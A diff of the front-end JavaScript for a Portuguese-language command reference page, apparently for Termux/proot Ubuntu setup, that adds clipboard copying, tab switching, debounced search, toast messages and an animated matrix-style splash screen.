+  el.parentElement.classList.toggle('open');
 }
 
-function filterCat(btn){
-  document.querySelectorAll('.categories button').forEach(function(b){ b.classList.remove('active'); });
-  btn.classList.add('active');
-  var cat = btn.getAttribute('data-cat');
-  if(cat === 'all'){
-    document.getElementById('q').value = '';
-    render('');
-    return;
-  }
-  var found = cards().filter(function(c){ return c.getAttribute('data-cat')===cat; });
-  document.getElementById('results').innerHTML = found.map(function(c){return c.outerHTML;}).join('');
-  document.getElementById('count').textContent = cat + ' (' + found.length + ' comandos)';
-}
-
-// ---------- busca com debounce ----------
-var debounceTimer = null;
-function onSearchInput(){
-  clearTimeout(debounceTimer);
-  debounceTimer = setTimeout(function(){
-    document.querySelectorAll('.categories button').forEach(function(b){ b.classList.remove('active'); });
-    render(document.getElementById('q').value);
-  }, 200);
-}
-function searchNow(){
-  clearTimeout(debounceTimer);
-  document.querySelectorAll('.categories button').forEach(function(b){ b.classList.remove('active'); });
-  render(document.getElementById('q').value);
-}
-
-// ---------- copiar comando ----------
-function copyCmd(btn){
-  var code = btn.parentNode.querySelector('.cmd').innerText || btn.parentNode.querySelector('.cmd').textContent;
-  var done = function(){
-    btn.textContent = '✓'; btn.classList.add('done');
-    setTimeout(function(){ btn.textContent = '📋'; btn.classList.remove('done'); }, 1500);
+function copyText(t) {
+  const doFallback = () => {
+    const ta = document.createElement('textarea');
+    ta.value = t;
+    ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); toast('📋 Copiado: ' + t); }
+    catch(e) { toast('⚠️ Copie manualmente: ' + t); }
+    ta.remove();
   };
-  if(navigator.clipboard && navigator.clipboard.writeText){
-    navigator.clipboard.writeText(code).then(done).catch(function(){ fallbackCopy(code, done); });
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(t).then(() => toast('📋 Copiado: ' + t)).catch(doFallback);
   } else {
-    fallbackCopy(code, done);
+    doFallback();
   }
 }
-function fallbackCopy(text, done){
-  var ta = document.createElement('textarea');
-  ta.value = text; ta.style.position='fixed'; ta.style.opacity='0';
-  document.body.appendChild(ta); ta.select();
-  try { document.execCommand('copy'); done(); } catch(e){}
-  document.body.removeChild(ta);
+
+// ============================================================
+// TABS + BUSCA + TOAST
+// ============================================================
+function switchTab(name, el) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById('tab-emular').classList.toggle('hidden', name !== 'emular');
+  document.getElementById('tab-comandos').classList.toggle('hidden', name !== 'comandos');
+  document.getElementById('cat-bar').style.display = name === 'comandos' ? 'flex' : 'none';
+  document.getElementById('count-info').style.display = name === 'comandos' ? 'block' : 'none';
+  window.scrollTo({ top: 0 });
 }
 
-document.getElementById('searchBtn').addEventListener('click', searchNow);
-document.getElementById('q').addEventListener('input', onSearchInput);
-document.getElementById('q').addEventListener('keydown', function(e){ if(e.key==='Enter') searchNow(); });
+let toastTimer;
+function toast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 2500);
+}
 
-renderCats();
-render('');
+// ============================================================
+// INIT
+// ============================================================
+let searchTimer;
+document.addEventListener('DOMContentLoaded', () => {
+  renderMethods();
+  renderCats();
+  renderCmds();
+  // esconde cat-bar na aba inicial (emular)
+  document.getElementById('cat-bar').style.display = 'none';
+  document.getElementById('count-info').style.display = 'none';
+
+  document.getElementById('search').addEventListener('input', (e) => {
+    query = e.target.value;
+    clearTimeout(searchTimer);
+    searchTimer = setTimeout(() => {
+      renderCmds();
+      // se está buscando, troca para aba comandos automaticamente
+      if (query.trim() && document.getElementById('tab-emular').classList.contains('hidden') === false) {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.tab')[1].classList.add('active');
+        document.getElementById('tab-emular').classList.add('hidden');
+        document.getElementById('tab-comandos').classList.remove('hidden');
+        document.getElementById('cat-bar').style.display = 'flex';
+        document.getElementById('count-info').style.display = 'block';
+      }
+    }, 180);
+  });
+});
+
+// ============================================================
+// ABERTURA ANIMADA (SPLASH)
+// ============================================================
+(function () {
+  var splash = document.getElementById('splash');
+  if (!splash) return;
+
+  /* --- chuva de codigo (matrix neon azul) --- */
+  var cv = document.getElementById('matrix');
+  var ctx = cv.getContext('2d');
+  var chars = ('アイウエオカキクケコサシスセソ0123456789<>#$[]{}/=+-*&%').split('');
+  var cols = 0, drops = [];
+  var FS = 15; /* tamanho da fonte/coluna */
+  function size() {
+    cv.width = window.innerWidth; cv.height = window.innerHeight;
+    cols = Math.floor(cv.width / FS);
+    drops = [];
+    /* posicoes INICIAIS aleatorias -> cachoeira de verdade (antes ficavam todas sincronizadas) */
+    for (var k = 0; k < cols; k++) drops.push(Math.floor(Math.random() * (cv.height / FS)));
+    ctx.font = FS + 'px monospace';
+  }
+  size();
+  window.addEventListener('resize', size);
+  function drawRain() {
+    /* rastro */
+    ctx.fillStyle = 'rgba(0,0,0,0.10)';
+    ctx.fillRect(0, 0, cv.width, cv.height);
+    ctx.font = FS + 'px monospace';
+    for (var i = 0; i < cols; i++) {
+      var y = drops[i] * FS;
+      /* caractere da cauda (azul neon) */
+      ctx.fillStyle = '#00b3e0';
+      ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * FS, y);
+      /* cabeca brilhante (azul claro) */
+      ctx.fillStyle = 'rgba(210,250,255,0.95)';
+      ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * FS, y - FS);
+      if (y > cv.height && Math.random() > 0.96) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  /* preenche a tela logo de cara para nao ficar vazia */
+  for (var w = 0; w < 14; w++) drawRain();
+  var rainTimer = setInterval(drawRain, 45);
+
+  /* --- digitacao no terminal --- */
+  var lines = [
+    ['root@phone:~$ ', 'pkg install proot-distro'],
+    ['root@phone:~$ ', 'proot-distro install ubuntu'],
+    ['root@phone:~$ ', 'proot-distro login ubuntu'],
+    ['ubuntu:~$ ', 'startxfce4 --display=:1'],
+    ['ubuntu:~$ ', 'T-TOOL carregado OK']
+  ];
+  var el = document.getElementById('term-lines');
+  var li = 0, ci = 0, html = '';
+  function type() {
+    if (li >= lines.length) return;
+    var p = lines[li][0], cmd = lines[li][1];
+    if (ci === 0) html += '<span class="p">' + p + '</span>';
+    if (ci < cmd.length) {
+      el.innerHTML = html + cmd.slice(0, ci + 1) + '<span class="caret"></span>';
+      ci++;
+      setTimeout(type, 26);
+    } else {
+      html += cmd + '<br>';
+      el.innerHTML = html + '<span class="caret"></span>';
+      li++; ci = 0;
+      setTimeout(type, 240);
+    }
+  }
+  setTimeout(type, 450);
+
+  /* --- encerrar a abertura --- */
+  document.body.style.overflow = 'hidden';
+  var done = false;
+  function hide() {
+    if (done) return; done = true;
+    splash.classList.add('hide');
+    document.body.style.overflow = '';
+    clearInterval(rainTimer);
+    setTimeout(function () { try { splash.remove(); } catch (e) {} }, 800);
+  }
+  var t = setTimeout(hide, 3900);
+  splash.addEventListener('click', function () { clearTimeout(t); hide(); });
+})();
 </script>
-
 </body>
 </html>
